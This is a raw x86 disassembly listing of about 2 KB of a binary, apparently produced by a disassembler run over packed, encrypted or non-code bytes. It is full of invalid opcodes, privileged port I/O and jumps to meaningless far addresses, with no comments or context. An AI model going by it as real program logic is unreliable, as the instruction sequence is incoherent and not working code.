  4170b2:	repnz push ebp
  4170b4:	mov    al,ds:0x3bb26461
  4170b9:	push   ds
  4170ba:	sahf   
  4170bb:	popa   
  4170bc:	out    dx,eax
  4170bd:	sbb    al,0x2
  4170bf:	dec    ecx
  4170c0:	cmp    eax,0x483aaa98
  4170c5:	or     DWORD PTR [edi],ebp
  4170c7:	cmc    
  4170c8:	pop    ss
  4170c9:	sub    BYTE PTR [edi+0x3376ceab],dh
  4170cf:	or     BYTE PTR [ebp-0x34],dl
  4170d2:	or     eax,0x864df81f
  4170d7:	xchg   esi,eax
  4170d8:	in     eax,0xb3
  4170da:	and    DWORD PTR [ebp+0x22],ecx
  4170dd:	or     al,0x19
  4170df:	daa    
  4170e0:	jbe    0x41706c
  4170e2:	imul   ebx,DWORD PTR [edx+0x7b9740de],0xffffffcb
  4170e9:	ins    BYTE PTR es:[edi],dx
  4170ea:	jp     0x417143
  4170ec:	js     0x41715e
  4170ee:	push   eax
  4170ef:	nop
  4170f0:	mov    ch,0xab
  4170f2:	mov    DWORD PTR [edx-0x61],eax
  4170f5:	int3   
  4170f6:	sti    
  4170f7:	fcomp  st(7)
  4170f9:	jae    0x41710c
  4170fb:	(bad)  
  4170fc:	jae    0x417131
  4170fe:	frstor [edx]
  417100:	ins    BYTE PTR es:[edi],dx
  417101:	out    0xc0,al
  417103:	adc    DWORD PTR [edi+ebp*4-0x193a174e],0x7bd1ba3c
  41710e:	push   es
  41710f:	int    0x86
  417111:	ins    DWORD PTR es:[edi],dx
  417112:	aaa    
  417113:	enter  0x45fa,0x0
  417117:	cli    
  417118:	push   eax
  417119:	ss ins DWORD PTR es:[edi],dx
  41711b:	out    0xb4,al
  41711d:	(bad)  
  41711f:	pop    edx
  417120:	fld    TBYTE PTR [eax+0x11]
  417123:	jne    0x417193
  417125:	outs   dx,DWORD PTR ds:[esi]
  417126:	hlt    
  417127:	adc    DWORD PTR [edi+0xf],0x405ba8f3
  41712e:	push   0xb857bcfb
  417133:	lahf   
  417134:	cmp    ebx,0xda9425cf
  41713a:	fist   WORD PTR [edi+eax*4]
  41713d:	jne    0x417123
  41713f:	sub    edx,DWORD PTR [esi-0x6]
  417142:	xchg   BYTE PTR [edi+0x28],bl
  417145:	xor    eax,0x6bccf38f
  41714a:	aad    0x4e
  41714c:	pop    edx
  41714d:	inc    ebx
  41714e:	gs mov al,0x87
  417151:	pop    ebp
  417152:	xor    BYTE PTR [ebx],bh
  417154:	call   0xc704:0x5acac94c
  41715b:	inc    edi
  41715c:	xor    DWORD PTR [ecx],esi
  41715e:	daa    
  41715f:	mov    ebp,0x82d356e0
  417164:	das    
  417165:	jle    0x417104
  417167:	es (bad) 
  417169:	fstp   QWORD PTR [ecx+0x2a9ec5c0]
  41716f:	mov    DWORD PTR [ebp+0x6],eax
  417172:	adc    dh,BYTE PTR [ecx]
  417174:	inc    edi
  417175:	push   cs
  417176:	lea    ebx,[eax]
  417178:	sbb    BYTE PTR [ecx],0x2d
  41717b:	adc    edi,DWORD PTR [eax+0x2d]
  41717e:	hlt    
  41717f:	jns    0x417129
  417181:	jecxz  0x41717d
  417183:	in     al,dx
  417184:	mov    ds:0xc3be444c,al
  417189:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41718a:	adc    ecx,ebp
  41718c:	sar    DWORD PTR [ecx-0x58e6b299],cl
  417192:	push   esp
  417193:	lds    ebx,FWORD PTR [eax+0x3e86ced2]
  417199:	loopne 0x41720e
  41719b:	jecxz  0x417177
  41719d:	js     0x417190
  41719f:	fwait
  4171a0:	outs   dx,BYTE PTR ds:[esi]
  4171a1:	xchg   esi,eax
  4171a2:	je     0x4171fc
  4171a4:	rep lods al,BYTE PTR ds:[esi]
  4171a6:	gs pop ecx
  4171a8:	inc    edx
  4171a9:	into   
  4171aa:	xchg   edx,eax
  4171ab:	jmp    0x93cb:0x1a6833f4
  4171b2:	mul    BYTE PTR [ebp-0x5a1d4f0e]
  4171b8:	push   cs
  4171b9:	jne    0x417221
  4171bb:	xor    edi,0xe4beba28
  4171c1:	repz test BYTE PTR [eax-0x75],cl
  4171c5:	cmp    edx,esi
  4171c7:	enter  0xecd8,0x89
  4171cb:	js     0x41722a
  4171cd:	mov    cl,0x8e
  4171cf:	sbb    eax,0x1303f16f
  4171d4:	pop    esp
  4171d5:	ins    BYTE PTR es:[edi],dx
  4171d6:	lods   eax,DWORD PTR ds:[esi]
  4171d7:	scas   eax,DWORD PTR es:[edi]
  4171d8:	xor    ch,BYTE PTR [ebp-0x5f6c9e88]
  4171de:	dec    edx
  4171df:	jmp    0xd964287d
  4171e4:	imul   ecx,DWORD PTR [ebx+0x41],0xffffffad
  4171e8:	rcr    BYTE PTR [ebp+edi*2-0x37],0x9c
  4171ed:	pop    eax
  4171ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4171ef:	mov    bh,BYTE PTR [edx+eiz*4+0x30f56565]
  4171f6:	ror    DWORD PTR [eax+ecx*4+0x2],cl
  4171fa:	pop    edi
  4171fb:	in     al,dx
  4171fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4171fd:	add    BYTE PTR [ecx-0x229cb1cf],ch
  417203:	mov    ah,0x7
  417205:	call   0xdecb2f80
  41720a:	xchg   edi,eax
  41720b:	sbb    DWORD PTR [edi+0xd7a9807],esi
  417211:	xchg   BYTE PTR [edi-0x33e4b996],ah
  417217:	jno    0x41724b
  417219:	jle    0x4171b7
  41721b:	loopne 0x417227
  41721d:	or     eax,eax
  41721f:	adc    al,0xf2
  417221:	pop    ebx
  417222:	and    eax,0x3fcea290
  417227:	cmc    
  417228:	pop    edx
  417229:	test   al,0x94
  41722b:	pushf  
  41722c:	jecxz  0x4171d1
  41722e:	fs dec eax
  417230:	enter  0x94f4,0x45
  417234:	add    edi,ebp
  417236:	into   
  417237:	xchg   edx,eax
  417238:	sti    
  417239:	test   DWORD PTR [eax],0x4d4c71be
  41723f:	jne    0x417297
  417241:	mov    al,ds:0x8231de87
  417246:	inc    ebp
  417247:	out    dx,eax
  417248:	test   DWORD PTR cs:[edx+0x19f280cd],ecx
  41724f:	cs pop ebx
  417251:	push   0xc4ea6328
  417256:	lods   al,BYTE PTR ds:[esi]
  417257:	mov    ds:0x44d586f2,eax
  41725c:	shufps xmm6,XMMWORD PTR [esi-0x27e24097],0x61
  417264:	and    ebp,DWORD PTR [ecx]
  417266:	mov    ebp,0xc63f4ec4
  41726b:	xchg   esi,eax
  41726c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41726d:	gs pushf 
  41726f:	mov    ebp,DWORD PTR [edi+esi*4+0x19]
  417273:	pop    eax
  417274:	pop    esp
  417275:	cmp    al,0xad
  417277:	test   BYTE PTR [edi-0x33],dl
  41727a:	xchg   ecx,eax
  41727b:	add    al,0xf8
  41727d:	jnp    0x41720e
  41727f:	call   0x6f9de840
  417284:	neg    DWORD PTR [ebx-0x79]
  417287:	fild   DWORD PTR [ebx]
  417289:	in     eax,0x3
  41728b:	ins    DWORD PTR es:[edi],dx
  41728c:	adc    eax,edx
  41728e:	inc    edx
  41728f:	xchg   DWORD PTR [ebx-0x2a],edi
  417292:	sub    ecx,DWORD PTR [ecx]
  417294:	mov    esp,0xa4e79cc6
  417299:	jne    0x417262
  41729b:	push   ebp
  41729c:	mov    DWORD PTR ds:0x22dc6b1e,edx
  4172a2:	mov    bh,0xa8
  4172a4:	push   ecx
  4172a5:	mov    edx,0xbf169ee9
  4172aa:	and    bh,BYTE PTR [edi-0x1bfe90dd]
  4172b0:	jp     0x4172dd
  4172b2:	or     eax,0xeb77e3b0
  4172b7:	and    DWORD PTR [esi+ebp*2+0x1c],esi
  4172bb:	out    0xf8,eax
  4172bd:	inc    esi
  4172be:	jmp    0x417314
  4172c0:	mov    dh,0x72
  4172c2:	mov    ds:0xa0d82abf,eax
  4172c7:	xchg   edx,eax
  4172c8:	mov    cl,0x81
  4172ca:	mov    edx,0xa63292a7
  4172cf:	ja     0x41728a
  4172d1:	loopne 0x417286
  4172d3:	inc    ecx
  4172d4:	sahf   
  4172d5:	in     eax,dx
  4172d6:	cmp    ebp,DWORD PTR [eax+0x3f4305e1]
  4172dc:	div    DWORD PTR [ebp-0x4f]
  4172df:	imul   ecx,edx,0x57
  4172e2:	mov    edi,0x339ef818
  4172e7:	adc    esi,DWORD PTR [eax+esi*8-0x9]
  4172eb:	push   edx
  4172ec:	add    bh,BYTE PTR [edx-0x66]
  4172ef:	jbe    0x4172e3
  4172f1:	or     dh,bh
  4172f3:	pop    ds
  4172f4:	pop    edi
  4172f5:	inc    ebx
  4172f6:	jne    0x41729e
  4172f8:	call   0x8d12:0xf80b0de2
  4172ff:	pushf  
  417300:	(bad)  
  417301:	data16 outs dx,BYTE PTR ds:[esi]
  417303:	retf   0x935d
  417306:	jecxz  0x41737b
  417308:	sti    
  417309:	(bad)  
  41730a:	call   0xee6e4bc6
  41730f:	outs   dx,DWORD PTR ds:[esi]
  417310:	push   ecx
  417311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417312:	out    0x53,al
  417314:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417315:	mov    esi,0x81cf9ee4
  41731a:	cdq    
  41731b:	out    0xf4,eax
  41731d:	xchg   BYTE PTR [ebx],bh
  41731f:	add    BYTE PTR [edi-0x2e],ah
  417322:	push   0xf888fc7c
  417327:	(bad)  
  417328:	addr16 je 0x417364
  41732b:	test   eax,0x19b5307e
  417330:	sub    dh,BYTE PTR [eax-0x44]
  417333:	mov    dh,0x2e
  417335:	shl    DWORD PTR [edx+0x62],1
  417338:	dec    ebx
  417339:	mov    ds:0x8e90ff7d,al
  41733e:	rol    bh,0xd9
  417341:	fsub   QWORD PTR [esi+eax*1-0x35]
  417345:	js     0x4172cb
  417347:	sub    eax,0x9928bae5
  41734c:	(bad)  
  41734d:	jns    0x4173c5
  41734f:	mov    edi,0xf325348d
  417354:	or     DWORD PTR [ecx-0x215e1178],edi
  41735a:	jbe    0x4172fd
  41735c:	lds    esp,FWORD PTR [ebx-0x2a207809]
  417362:	pop    es
  417363:	popf   
  417364:	push   0x5dc26c5d
  417369:	fwait
  41736a:	mov    esp,ss
  41736c:	loopne 0x4173a7
  41736e:	sahf   
  41736f:	nop
  417370:	or     eax,DWORD PTR [eax-0x2a3cb065]
  417376:	dec    esi
  417377:	retf   
  417378:	pusha  
  417379:	mov    eax,ds:0x70fec1db
  41737e:	mov    al,0xbc
  417380:	jge    0x417357
  417382:	dec    edi
  417383:	pop    esp
  417384:	and    BYTE PTR [edi+0x197fa6d3],ch
  41738a:	or     dh,BYTE PTR [eax+eax*2]
  41738d:	jle    0x4173fe
  41738f:	pop    es
  417390:	push   edx
  417391:	hlt    
  417392:	ins    BYTE PTR es:[edi],dx
  417393:	cld    
  417394:	inc    ecx
  417395:	jae    0x417370
  417397:	imul   ebp,ebx,0x89e9993
  41739d:	(bad)  
  41739e:	mov    ds:0x64af678e,eax
  4173a3:	iret   
  4173a4:	push   ss
  4173a5:	mov    ah,BYTE PTR [edi+0x3b]
  4173a8:	mov    BYTE PTR [edx+ebx*2],0xe9
  4173ac:	bound  ecx,QWORD PTR [ebp+0x18]
  4173af:	mov    esi,0xe0af6367
  4173b4:	es sub cl,ch
  4173b7:	lahf   
  4173b8:	sbb    esp,eax
  4173ba:	mov    dl,0x56
  4173bc:	mov    ss:0x7012f617,eax
  4173c2:	jae    0x4173cd
  4173c4:	mov    ds:0x381d2ea9,al
  4173c9:	dec    BYTE PTR [edx-0x481855c7]
  4173cf:	nop
  4173d0:	popf   
  4173d1:	ss int 0x15
  4173d4:	xor    eax,0x6d40352d
  4173d9:	dec    ebp
  4173da:	dec    edx
  4173db:	mov    esp,0x60f8e9d3
  4173e0:	leave  
  4173e1:	inc    edx
  4173e2:	adc    DWORD PTR [eax+eax*4+0x1a739d69],esi
  4173e9:	repz clc 
  4173eb:	test   eax,0xfeef1d92
  4173f0:	shl    DWORD PTR [eax-0x4b],1
  4173f3:	dec    ebp
  4173f4:	sbb    edi,DWORD PTR [ecx+0x5f]
  4173f7:	ficom  WORD PTR [esi-0xfbbc05f]
  4173fd:	mov    eax,0x49321c4f
  417402:	cmc    
  417403:	dec    edx
  417404:	sbb    BYTE PTR [edi+0x75],ch
  417407:	fs in  eax,0xf0
  41740a:	pop    ecx
  41740b:	add    BYTE PTR [eax-0x4a301da8],ch
  417411:	mov    DWORD PTR [eax+0x67c3bcb3],eax
  417417:	mov    esi,0x98f10ea5
  41741c:	dec    edi
  41741d:	test   eax,0xd68c28d3
  417422:	icebp  
  417423:	sahf   
  417424:	pop    ds
  417425:	fild   DWORD PTR [esi-0xc42418e]
  41742b:	sbb    DWORD PTR [eax],ebp
  41742d:	sub    DWORD PTR ds:0x5b28550f,0x7482cc1d
  417437:	stos   BYTE PTR es:[edi],al
  417438:	aad    0xb5
  41743a:	inc    BYTE PTR [eax+esi*2+0x5a42979b]
  417441:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417442:	scas   eax,DWORD PTR es:[edi]
  417443:	mov    dl,0xa1
  417445:	fld    TBYTE PTR [ecx+0x49b5d426]
  41744b:	xor    BYTE PTR [eax+0x51],bl
  41744e:	pop    ebp
  41744f:	scas   eax,DWORD PTR es:[edi]
  417450:	and    bl,al
  417452:	push   edi
  417453:	das    
  417454:	div    BYTE PTR [edx]
  417456:	mov    ch,BYTE PTR [eax+0x5ad338cc]
  41745c:	jmp    0x4174d5
  41745e:	mov    edi,0x590aefca
  417463:	dec    esi
  417464:	clc    
  417465:	sar    BYTE PTR [ecx+0x20],cl
  417468:	lds    edx,FWORD PTR [ecx]
  41746a:	je     0x41740b
  41746c:	ss push ebp
  41746e:	jl     0x4174a8
  417470:	mov    ebx,DWORD PTR [esi+0x46]
  417473:	scas   al,BYTE PTR es:[edi]
  417474:	call   0xa07d:0xa4e7e399
  41747b:	sub    DWORD PTR [edx+eiz*1+0x7c],esp
  41747f:	and    al,0xcb
  417481:	adc    al,0x31
  417483:	sbb    eax,0x938c8722
  417488:	push   0x46
  41748a:	repz fadd QWORD PTR [ebp+0x7]
  41748e:	popf   
  41748f:	popa   
  417490:	mov    dl,0x6d
  417492:	addr16 jo 0x4174bb
  417495:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417496:	push   esp
  417497:	cmp    edi,DWORD PTR [edx-0x6562e74a]
  41749d:	and    BYTE PTR [eax+ebp*8+0xb34e7fc],dl
  4174a4:	jmp    0xd27c73b1
  4174a9:	out    0x2a,eax
  4174ab:	mov    dl,0xcd
  4174ad:	inc    esi
  4174ae:	das    
  4174af:	aam    0x83
  4174b1:	leave  
  4174b2:	mov    eax,ds:0x36f6f368
  4174b7:	mov    al,ds:0xd1ded465
  4174bc:	bound  edx,QWORD PTR [esi+0x22]
  4174bf:	data16 add al,0x33
  4174c2:	push   ebx
  4174c3:	mov    ecx,es
  4174c5:	and    al,0x92
  4174c7:	and    al,0xe5
  4174c9:	iret   
  4174ca:	push   0xd6f83fb6
  4174cf:	ja     0x417467
  4174d1:	retf   
  4174d2:	inc    ecx
  4174d3:	icebp  
  4174d4:	in     eax,0xf
  4174d6:	mov    ds:0xbd8478d6,al
  4174db:	lea    ecx,[edi]
  4174dd:	jne    0x41746e
  4174df:	repz sbb BYTE PTR [esp+edi*8],cl
  4174e3:	outs   dx,DWORD PTR ds:[esi]
  4174e4:	push   eax
  4174e5:	dec    ebp
  4174e6:	in     eax,0x51
  4174e8:	sar    eax,0xd4
  4174eb:	fwait
  4174ec:	jg     0x417483
  4174ee:	test   ebp,ebp
  4174f0:	(bad)  
  4174f1:	mov    ch,0xe4
  4174f3:	mov    ecx,gs
  4174f5:	pushf  
  4174f6:	add    BYTE PTR [ebx+ecx*2],dl
  4174f9:	out    0xd2,eax
  4174fb:	(bad)  
  4174fc:	jnp    0x41752c
  4174fe:	dec    edi
  4174ff:	add    ch,bl
  417501:	dec    edx
  417502:	jb     0x417512
  417504:	dec    ebp
  417505:	mov    ecx,es
  417507:	xchg   edx,eax
  417508:	call   ebp
  41750a:	int3   
  41750b:	mov    eax,ds:0xf6a226
  417510:	jp     0x4174c5
  417512:	and    al,0x6b
  417514:	mov    cl,0xb
  417516:	and    al,0xf9
  417518:	push   ds
  417519:	(bad)  
  41751a:	or     edi,DWORD PTR [edx-0x13d447ec]
  417520:	inc    edx
  417521:	or     DWORD PTR [ebx-0x5a],0xffffffc6
  417525:	out    dx,eax
  417526:	(bad)  
  417527:	push   0x73fc3511
  41752c:	jbe    0x4174d9
  41752e:	add    cl,0xdc
  417531:	loop   0x4174bd
  417533:	mov    eax,DWORD PTR [esi]
  417535:	outs   dx,BYTE PTR ds:[esi]
  417536:	mov    eax,0x1d74b44e
  41753b:	fiadd  DWORD PTR [ecx+0x36]
  41753e:	mov    ds:0x4be5e018,eax
  417543:	(bad)  
  417544:	mov    dh,0x4e
  417546:	sbb    BYTE PTR [esi+ebx*1-0x29],cl
  41754a:	call   0xb6dfad0e
  41754f:	jl     0x417521
  417551:	jno    0x41758c
  417553:	or     bh,dh
  417555:	fmul   DWORD PTR ds:0xba92d16e
  41755b:	das    
  41755c:	or     BYTE PTR [eax+eax*1],ah
  41755f:	and    BYTE PTR [eax],ah
  417561:	(bad)  
  417562:	push   edx
  417563:	pop    ecx
  417564:	imul   esi,DWORD PTR [ebx+0x4f710124],0xbc09b52a
  41756e:	jge    0x4175a9
  417570:	mov    ah,0xbe
  417572:	cmc    
  417573:	hlt    
  417574:	popf   
  417575:	ror    DWORD PTR [edx],cl
  417577:	jnp    0x417591
  417579:	mov    ebp,0xedcdbbb4
  41757e:	adc    al,0xa6
  417580:	and    ch,al
  417582:	lea    esp,[eax]
  417584:	mov    dl,0x9
  417586:	ret    
  417587:	in     al,dx
  417588:	int    0x48
  41758a:	leave  
  41758b:	out    dx,al
  41758c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41758d:	xlat   BYTE PTR ds:[ebx]
  41758e:	sahf   
  41758f:	nop
  417590:	call   0xf046:0x6f955684
  417597:	pop    edx
  417598:	loop   0x417606
  41759a:	cwde   
  41759b:	or     ch,BYTE PTR [esi]
  41759d:	dec    esi
  41759e:	jle    0x417581
  4175a0:	mov    ebx,0x58799fc4
  4175a5:	lock rcr cl,0x79
  4175a9:	cmc    
  4175aa:	in     al,0xf2
  4175ac:	dec    esp
  4175ad:	or     eax,0xd6e00165
  4175b2:	in     eax,dx
  4175b3:	cdq    
  4175b4:	fs sub al,0xa8
  4175b7:	(bad)  
  4175b8:	leave  
  4175b9:	sti    
  4175ba:	ror    ecx,cl
  4175bc:	mov    edi,DWORD PTR [ebp+0x2224d74b]
  4175c2:	ret    
  4175c3:	in     eax,0xab
  4175c5:	ret    0x3b31
  4175c8:	jg     0x41759e
  4175ca:	(bad)  
  4175cb:	jmp    0x7be5:0xa14329f
  4175d2:	mov    bh,0xb6
  4175d4:	addr16 dec ecx
  4175d6:	nop
  4175d7:	dec    esi
  4175d8:	cld    
  4175d9:	cmc    
  4175da:	js     0x417605
  4175dc:	cmp    ebx,DWORD PTR [edi-0x60]
  4175df:	add    DWORD PTR [ecx+0x4],edi
  4175e2:	jge    0x417660
  4175e4:	xor    al,0x62
  4175e6:	pop    DWORD PTR [edx]
  4175e8:	lea    edx,[ecx]
  4175ea:	je     0x41763e
  4175ec:	aad    0xc9
  4175ee:	stc    
  4175ef:	(bad)  [ebx-0x2e85dcfe]
  4175f5:	call   0x43396ff0
  4175fa:	mov    esi,0x6f895a2c
  4175ff:	out    0xc0,eax
  417601:	call   0x951b9b8f
  417606:	adc    ecx,DWORD PTR [esi-0x3a]
  417609:	stc    
  41760a:	ins    DWORD PTR es:[edi],dx
  41760b:	fs fucom st(2)
  41760e:	adc    BYTE PTR [esi],bl
  417610:	and    eax,0xd5cc5160
  417615:	mov    ebx,0x20d20088
  41761a:	(bad)  
  41761b:	out    dx,al
  41761c:	mov    esp,DWORD PTR [eax+0x18]
  41761f:	mov    dl,0xb9
  417621:	sbb    ah,BYTE PTR [ecx+0x13]
  417624:	mov    al,0x39
  417626:	(bad)  
  417627:	out    dx,al
  417628:	stos   DWORD PTR es:[edi],eax
  417629:	aad    0x8f
  41762b:	xlat   BYTE PTR ds:[ebx]
  41762c:	rol    DWORD PTR [edx+0x434dbe4b],0x9f
  417633:	scas   eax,DWORD PTR es:[edi]
  417634:	add    al,ch
  417636:	mov    ah,0xe4
  417638:	loopne 0x41762c
  41763a:	(bad)  
  41763b:	(bad)  
  41763c:	sbb    eax,0xb78a44
  417641:	adc    ecx,DWORD PTR [esi-0x70849e4c]
  417647:	or     al,0xb1
  417649:	sbb    BYTE PTR [edi],ah
  41764b:	popa   
  41764c:	loop   0x4176c3
  41764e:	js     0x417662
  417650:	or     cl,BYTE PTR [ebp+0x65da2bcb]
  417656:	jecxz  0x41760c
  417658:	cmc    
  417659:	xchg   ebx,eax
  41765a:	jle    0x4176d4
  41765c:	jnp    0x4175f4
  41765e:	jle    0x417683
  417660:	fs scas eax,DWORD PTR es:[edi]
  417662:	gs sbb esi,DWORD PTR cs:[edi+0x1f7c980]
  41766a:	(bad)  
  41766b:	sub    dl,BYTE PTR [edx+edx*4+0x7e]
  41766f:	lods   al,BYTE PTR ds:[esi]
  417670:	shl    DWORD PTR [ebx+0x7],0xc2
  417674:	xchg   ebx,eax
  417675:	add    DWORD PTR [eax+edi*1-0x21f6c47],edx
  41767c:	shr    DWORD PTR [esi],cl
  41767e:	out    dx,al
  41767f:	inc    esp
  417680:	or     edx,0x45
  417683:	neg    DWORD PTR [edi-0x69]
  417686:	retf   
  417687:	inc    esp
  417688:	stos   BYTE PTR es:[edi],al
  417689:	aad    0x1f
  41768b:	push   ss
  41768c:	xchg   esp,eax
  41768d:	pop    eax
  41768e:	pop    esp
  41768f:	sub    DWORD PTR [esi],ebp
  417691:	frstor [edx]
  417693:	shl    BYTE PTR [esi-0x76c252fc],1
  417699:	aaa    
  41769a:	jb     0x417665
  41769c:	pop    edi
  41769d:	mov    esi,0xc969b964
  4176a2:	arpl   WORD PTR [ebp-0x18],cx
  4176a5:	xchg   edi,eax
  4176a6:	mov    edi,0x6ab66933
  4176ab:	xchg   esi,eax
  4176ac:	call   FWORD PTR [ecx+ebp*1+0xb24747]
  4176b3:	imul   ecx,ebp,0x8bd98a6f
  4176b9:	mov    ch,dh
  4176bb:	arpl   WORD PTR [edx-0x17],dx
  4176be:	pop    ds
  4176bf:	jl     0x41767b
  4176c1:	sub    eax,0xceda5220
  4176c6:	push   0x838b09db
  4176cb:	cwde   
  4176cc:	popf   
  4176cd:	mov    bh,0xe
  4176cf:	cmc    
  4176d0:	xor    eax,0xcd71184b
  4176d5:	or     bh,bl
  4176d7:	cmc    
  4176d8:	jns    0x4176bc
  4176da:	and    esi,ebx
  4176dc:	sahf   
  4176dd:	nop
  4176de:	dec    edx
  4176df:	dec    esi
  4176e0:	xor    al,0x43
  4176e2:	scas   eax,DWORD PTR es:[edi]
  4176e3:	add    al,0x68
  4176e5:	out    dx,al
  4176e6:	pop    esi
  4176e7:	xor    ecx,esi
  4176e9:	ds xchg ebp,eax
  4176eb:	pop    eax
  4176ec:	sbb    DWORD PTR [esi+0x7d],ecx
  4176ef:	cmp    BYTE PTR [esi],bh
  4176f1:	mov    bl,0xba
  4176f3:	clc    
  4176f4:	inc    ebp
  4176f5:	add    al,0xe5
  4176f7:	cmp    bh,BYTE PTR [edi]
  4176f9:	xchg   edi,eax
  4176fa:	jmp    0xeb25:0x9c02df50
  417701:	mov    bl,BYTE PTR [edx-0x55]
  417704:	repz mov dl,0x72
  417707:	scas   al,BYTE PTR es:[edi]
  417708:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417709:	mov    DWORD PTR [edx],ebp
  41770b:	xor    eax,0x6c0cec49
  417710:	ret    
  417711:	xor    eax,0x7b74d6c
  417716:	fwait
  417717:	or     ebp,DWORD PTR [ebx-0x480d0c8b]
  41771d:	ja     0x417788
  41771f:	dec    esi
  417720:	jge    0x4176ba
  417722:	sbb    esp,DWORD PTR [ebp-0x2cc09d04]
  417728:	add    eax,0x66774d22
  41772d:	and    al,0xe8
  41772f:	inc    edi
  417730:	cs mov ch,0xd9
  417733:	ret    0xfa54
  417736:	lods   eax,DWORD PTR ds:[esi]
  417737:	xchg   ecx,eax
  417738:	xlat   BYTE PTR ds:[ebx]
  417739:	sbb    ecx,esi
  41773b:	cmp    eax,0xfde23f78
  417740:	lahf   
  417741:	(bad)  
  417742:	xor    dl,BYTE PTR [bp+di-0x69]
  417746:	xor    esp,DWORD PTR [edx-0x6095db48]
  41774c:	addr16 dec ebx
  41774e:	ret    0x94eb
  417751:	aas    
  417752:	les    edx,FWORD PTR [edi+0x41]
  417755:	push   edx
  417756:	mov    ds:0x3df5abb9,eax
  41775b:	sub    ebx,DWORD PTR [ebx+0x700d3f88]
  417761:	fs sub ebx,ecx
  417764:	ds aas 
  417766:	addr16 inc ebx
  417768:	ds call 0x46a0:0xa8e40d4d
  417770:	mov    esp,0x25e36ace
  417775:	dec    edx
  417776:	cmp    cl,BYTE PTR [ecx+edi*1+0x7f0955ad]
  41777d:	xor    ch,BYTE PTR [ecx+edx*4]
  417780:	cmp    ebx,ebx
  417782:	jno    0x417775
  417784:	add    BYTE PTR [edx+edi*1+0x15a3f47a],ch
  41778b:	retf   
  41778c:	mov    ds:0xf5ef11ac,al
  417791:	adc    dl,dh
  417793:	push   es
  417794:	mov    esp,0x1e51008c
  417799:	dec    eax
  41779a:	in     al,0x28
  41779c:	add    dh,dh
  41779e:	icebp  
  41779f:	dec    esi
  4177a0:	sbb    al,bl
  4177a2:	enter  0x1ede,0xfe
  4177a6:	add    edi,DWORD PTR [esi+0xe]
  4177a9:	sbb    BYTE PTR [eax+edx*2+0xd],bl
  4177ad:	cmc    
  4177ae:	shl    DWORD PTR [edi+0x3f],1
  4177b1:	inc    ecx
  4177b2:	iret   
  4177b3:	inc    ebx
  4177b4:	and    DWORD PTR [ebx],edi
  4177b6:	fisttp WORD PTR [edx+0x1b]
  4177b9:	out    dx,eax
  4177ba:	mov    eax,ds:0x2c308046
  4177bf:	into   
  4177c0:	mov    es,WORD PTR [esi+0x598e4ac6]
  4177c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4177c7:	mov    ch,0xc
  4177c9:	mov    ecx,0xc81d60c1
  4177ce:	sbb    al,0xba
  4177d0:	mov    eax,ds:0x99928d3a
  4177d5:	pop    esp
  4177d6:	dec    esp
  4177d7:	jmp    0x4177d0
  4177d9:	loop   0x4177b7
  4177db:	in     al,dx
  4177dc:	sub    BYTE PTR [ebx],0x1b
  4177df:	xchg   edi,eax
  4177e0:	icebp  
  4177e1:	add    al,0x25
  4177e3:	xchg   edi,esp
  4177e5:	push   eax
  4177e6:	jbe    0x41780b
  4177e8:	clc    
  4177e9:	daa    
  4177ea:	or     eax,0xe71f9a3
  4177ef:	movlps QWORD PTR [eax-0x34],xmm6
  4177f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4177f4:	enter  0xdd92,0x29
  4177f8:	fdiv   QWORD PTR [ecx+0x556bf05a]
  4177fe:	mov    esp,0x16a7daf5
  417803:	cmp    eax,0x73e77a3d
  417808:	(bad)  
  417809:	push   esi
  41780a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41780b:	jo     0x417847
  41780d:	lea    edx,[ebx+edx*4-0x25]
  417811:	mov    ecx,0xbe2eb20d
  417816:	xchg   BYTE PTR [edi],dl
  417818:	sbb    DWORD PTR [eax-0x15],ebx
  41781b:	dec    esi
  41781c:	ss gs iret 
  41781f:	test   al,0x5
  417821:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  417822:	xchg   esi,eax
  417823:	and    eax,0x55518f02
  417828:	out    0xd1,al
  41782a:	ficomp WORD PTR [eax+0xeb7c3bd]
  417830:	jge    0x417892
  417832:	pop    ebx
  417833:	sub    bl,BYTE PTR [esi-0x33]
  417836:	dec    ebx
  417837:	lock ds mov cl,0xb8
  41783b:	jo     0x417819
  41783d:	and    ecx,DWORD PTR [edi-0x7a]
  417840:	xor    bh,BYTE PTR gs:[ebx-0x59998ab4]
  417847:	adc    esi,DWORD PTR [edi+ecx*1+0x5f]
  41784b:	int3   
  41784c:	rol    BYTE PTR [edx+ecx*1-0x17],cl
  417850:	ffree  st(0)
  417852:	loop   0x4177fc
  417854:	rcl    BYTE PTR [esi-0x6cb4c34],cl
  41785a:	pop    gs
  41785c:	and    ah,al
  41785e:	xor    esi,DWORD PTR [esi+0x31b6a65e]
  417864:	jns    0x41787a
  417866:	mov    eax,ds:0x1ba85839
  41786c:	pop    ebx
  41786d:	jae    0x417851
  41786f:	mov    DWORD PTR ds:0x34d1f6d3,esp
  417875:	(bad)  
  417877:	mov    dh,0xe0
  417879:	adc    DWORD PTR [esi-0x32c2a6f8],eax
  41787f:	pop    ebx
  417880:	adc    ebx,DWORD PTR [edi-0x45127713]
  417886:	jno    0x4178ea
  417888:	inc    esp
  417889:	cmp    al,bh
  41788b:	(bad)  
  41788c:	call   0xb822455
  417891:	(bad)  
  417892:	add    ah,BYTE PTR [ebp+0x2d11f23]
  417898:	mov    ecx,0xb81f3a5c
  41789d:	loopne 0x417919
  41789f:	mov    ch,0xa8
  4178a1:	cs stos BYTE PTR es:[edi],al
  4178a3:	or     al,BYTE PTR [ecx+0x79]
  4178a6:	pop    edi
  4178a7:	jo     0x41787a
  4178a9:	retf   0x189a
  4178ac:	sti    
  4178ad:	and    ah,BYTE PTR [esi+0x59]
  4178b0:	mov    edi,0xa2d02ca0
